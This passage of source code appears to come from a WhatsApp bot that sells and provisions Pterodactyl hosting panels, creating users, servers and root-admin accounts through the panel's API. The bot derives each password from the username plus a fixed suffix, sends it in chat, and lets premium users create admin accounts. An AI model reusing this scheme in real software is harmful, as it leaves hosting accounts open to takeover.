if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "14100"
let cpu = "300"
let disk = "14100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cp15gb': 
case '15gb':
case 'panel15gb': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[3].replace(/[^+0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "15100"
let cpu = "300"
let disk = "15100"
let email = username + "@gmail.com"
let password = username + "72bdd9"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'cpunliall':
case 'unliall':
case 'panelunli': {
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`Example : ${prefix+command} username,number`)
let username = t[0];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let name = username
let egg = "15"
let loc = "1"
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@gmail.com"
let password = username + "274h8"
if (!u) return
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let deskripsi = `${xdate}${xtime} Create By ${pushname}`
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
newReply(`_Creating a Server for ${pushname}_`)
let ctf = `
*Hi @${u.split`@`[0]} Here's Your Panel Data*
*FROM @${m?.sender.split('@')[0]}* `+readmore+`
┏━ ⬣『 *ACCOUNT DATA*』⬣ ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *Password :* ${password}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
*CPU :*${cpu}%
┃ *Created :* ${pushname}
Day :* ${xdate}
┃ *Hour :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛
`+readmore+`
*PROFIT :*
- *CAN CHANGE SC*
- *BOT CAN BE ON 24 HOURS*
- *WEB CLOSE BOT ON*
- *DO NOT WASTE QUOTA*
- *DOES NOT CONSUME HP RAM*
- 15 DAY WARRANTY*

*NOTES:*
- *TAKE GOOD CARE OF YOUR PANEL DATA*
- *OWN ONLY SEND 1X DATA*
- *ENTER GROUP FOR INFO*
- *SS PANEL WITH CP .DONE*
- *HUB ONW IF THERE ARE PROBLEMS*
- *NO RUN SC DDOS*
- *NO DDOS DOMAIN*
- *NO SPREAD DOMAIN*

*RELATED? DELETED NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANK YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👤 CREATED","url":"https://wa.me/${m?.sender.split('@')[0]}?text=Done+By+Toxxic+Boy","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 GROUP BUYER","url":"${global.gr}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: ownername,
serverMessageId: 145
}
}})}}
}, {quoted: m})
await ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey,
},
"body": JSON.stringify({
"name": name,
"description": deskripsi,
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 0,
"backups": 0,
"allocations": 0
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`
*Success create panel ✅*`+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *Email :* ${email}
┃ *Username :* ${user.username}
┃ *ID Server :* ${server.id}
┃ *ID User :* ${user.id}
┃ *Ram :* ${memo} MB
┃ *Disk :* ${disk} MB
┃ *CPU :* ${cpu}%
┃ *Created :* ${pushname}
┃ *Made Today:* ${xdate}
┃ *O'clock :* ${xtime}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

Username and Password Have Been Sent
To @${u.split`@`[0]} Bang @${m?.sender.split('@')[0]}`)

}
break
case 'addadmin':
case 'cadmin':
case 'buatadmin':
case 'addpt':
case 'addownpt': {
if (!isPremium && !isCreator) return newReply(ownernya)
let t = text.split(',');
if (t.length < 3) return newReply(`Example : ${prefix+command} email,username,name,nomor`);
let email = t[0];
let username = t[1];
let name = t[2];
let u = m.quoted ? m.quoted.sender: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
if (!u) return newReply(`Example : ${prefix+command} email,username,name,nomor`);
let d = (await ToxxicTechInc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username +"adm910"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": name,
"last_name": "Memb",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let p = newReply(`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *UUID :* ${user.uuid}
┃ *Username :* ${user.username}
┃ *Email :* ${user.email}
┃ *Admin :* ${user.root_admin}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛

The data has been sent to private chat`)
let teksnyo = `
*THE FOLLOWING IS YOUR ADMIN PANEL DATA* `+readmore+`
┏━  ⬣『 *ACCOUNT DATA*  』⬣  ━┓
┣━━━━━━━━━━━━━━━━━━┓
┃ *ID USER :* ${user.id}
┃ *Email :* ${user.email}
┃ *Username :* ${user.username}
┃ *Password :* ${password.toString()}
┣━━━━━━━━━━━━━━━━━━┫
┗━━━━━━━━━━━━━━━━━━┛`+readmore+`
*PROFIT :*
- *CAN CREATE PANEL*

*RULES :*
- JOIN GROUP FOR INFORMATIONS
- *NO RIOT PROHIBITED*
- *NOT PEERING AT OTHER SRVs*
- *PROHIBITED BY NYRI SC*
- *PROHIBITED FROM SELLING BY ADMIN*
- *DDOS PANEL PROHIBITED*

*VIOLATION? IN DELETE NO REFF*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: teksnyo
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `THANKS YOU FOR ORDERING`
}),
header: proto.Message.InteractiveMessage.Header.create({

title: '',
gifPlayback: true,
subtitle: '',
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://telegra.ph/file/b355e4b093846225b74ad.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"👥 LINK GROUP","url":"${gr}","merchant_url":"https://www.google.com"}`
}, 
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"🌐 LINK LOGIN","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "📛 COPY USERNAME",
"copy_code": `${user.username}`
})
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "🔐 COPY PASSWORD",
"copy_code": `${password.toString()}`
})
},
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: '120363336528578108@newsletter',
newsletterName: `${global.wm}`,
serverMessageId: 145
}
}})}}
}, {quoted: m})
ToxxicTechInc.relayMessage(u, msg.message, {
messageId: msg.key.id
})
}
break
case 'cpanel': {
ToxxicTechInc.sendMessage(from, { react: { text: "🫡", key: m.key } })
if (!isPremium && !isCreator) return replyprem(mess.prem)
let t = text.split(',');
if (t.length < 2) return newReply(`*Wrong format!*
Example :
${prefix + command} user,number`)
let username = t[0];
let u = m.quoted ? m.quoted: t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net': m.mentionedJid[0];
let sections = [{
title: 'PLEASE SELECT THE RAM PANEL YOU WILL MAKE',
highlight_label: '𝐂𝐇𝐎𝐎𝐒𝐄 𝐂𝐎𝐌𝐑𝐀𝐃𝐄',
rows: [{
title: '1 GB', 
description: "RAM 1 GB CPU 30%", 
id: `.cp1gb ${username},${u}`
}, {
title: '2 GB', 
description: "RAM 2 GB CPU 60%", 
id: `.cp2gb ${username},${u}`
}, {
title: '3 GB', 
description: "RAM 3 GB CPU 90%", 
id: `.cp3gb ${username},${u}`
}, {
title: '4 GB', 
description: "RAM 4 GB CPU 120%", 
id: `.cp4gb ${username},${u}`
}, {
title: '5 GB', 
description: "RAM 5 GB CPU 150%", 
id: `.cp5gb ${username},${u}`
}, {
title: '6 GB', 
description: "RAM 6 GB CPU 180%", 
id: `.cp6gb ${username},${u}`
}, {
title: '7 GB', 
description: "RAM 7 GB CPU 210%", 
id: `.cp7gb ${username},${u}`
}, {
title: '8 GB', 
description: "RAM 8 GB CPU 240%", 
id: `.cp8gb ${username},${u}`
}, {
title: '9 GB', 
description: "RAM 9 GB CPU 270%", 
id: `.cp9gb ${username},${u}`
}, {
title: '10 GB', 
description: "RAM 10 GB CPU 300%", 
id: `.cp10gb ${username},${u}`
}, {
title: '11 GB', 
description: "RAM 11 GB CPU 300%", 
id: `.cp11gb ${username},${u}`
}, {
title: '12 GB', 
description: "RAM 12 GB CPU 300%", 
id: `.cp12gb ${username},${u}`
}, {
title: '13 GB', 
description: "RAM 13 GB CPU 300%", 
id: `.cp13gb ${username},${u}`
}, {
title: '14 GB', 
description: "RAM 14 GB CPU 300%", 
id: `.cp14gb ${username},${u}`
}, {
title: '15 GB', 
description: "RAM 15 GB CPU 300%", 
id: `.cp15gb ${username},${u}`
}, {
title: 'UNLIMITED',
description: `UNLIMITED RAM & CPU`, 
id: `.cpunliall ${username},${u}`
}]
}]

let listMessage = {
    title: 'AVAILABLE RAM BY RIAS V2', 
    sections
};

let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: 'CREATED BY ToxxicTechInc', 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: ToxxicTechInc.decodeJid(ToxxicTechInc.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "PLEASE SELECT THE RAM PANEL YOU WILL MAKE"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: `${pushname}`
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hi @${sender.split("@")[0]} 👋*`,
 subtitle: "dcdXdino",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/hLdW1MR/IMG-20240906-154741-714.jpg" } }, { upload: ToxxicTechInc.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage)
 },
 ]
 })
 })
 }
 }
}, {})

await ToxxicTechInc.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case 'reinstall': {
if (!isCreator) return newReply(ownernya)
let srv = args[0]
if (!srv) return newReply('ID?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return newReply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "delusr": {
if (!isCreator) return newReply(ownernya)
let usr = args[0]
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = await f.json()
if (res.errors) return newReply('*USER NOT FOUND*')
let u = res.attributes
newReply(`*${u.username.toUpperCase()} USER DETAILS*

\`\`\`ID: ${u.id}
UUID: ${u.uuid}
USERNAME: ${u.username}
EMAIL: ${u.email}
NAME: ${u.first_name} ${u.last_name}
LANGUAGE: ${u.language}
ADMIN: ${u.root_admin}
CREATED AT: ${u.created_at}\`\`\``)
}
break
case 'updatesrv': {
if (!isCreator) return newReply(ownernya)
let t = text.split(',');
if (t.length < 4) return newReply(`*Wrong format*

Example : 
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${xdate}
UPDATED AT: ${server.updated_at}`)
}
break

case "listsrv": {
  if (!isCreator) return newReply(`Sorry, you can't see the server list.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    });
    
    let data = await f3.json();
    var status = data.attributes ? data.attributes.current_state : s.status;  
  
  }
  
  ToxxicTechInc.sendList(m.chat, `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}`, "Powered By ToxxicTechInc", {
                    title: `Total Server: ${res.meta.pagination.count}`, sections: [{
                        title: "List Servers Panel",
                        rows: servers.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${status}`,
                                description: a.attributes.name,
                                id: `.delsrv ${a.attributes.id}`
                        }))
                    }]
                })
                
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Use command ${prefix}listsrv ${res.meta.pagination.current_page + 1} To see the next page.`);
  }
}
break;
case "listusr": {
  if (!isCreator) return newReply(mess.premium)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  });
  let res = await f.json();
  let users = res.data;
  
  messageText = `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  totalUsr = `Total Users: ${res.meta.pagination.count}`;
  
  ToxxicTechInc.sendList(m.chat, messageText, "Powered By ToxxicTechInc", {
                    title: totalUsr, sections: [{
                        title: "List Users Panel",
                        rows: users.map(a => ({
                                title: `ID: ${a.attributes.id} - Status: ${a.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}`,
                                description: a.attributes.username,
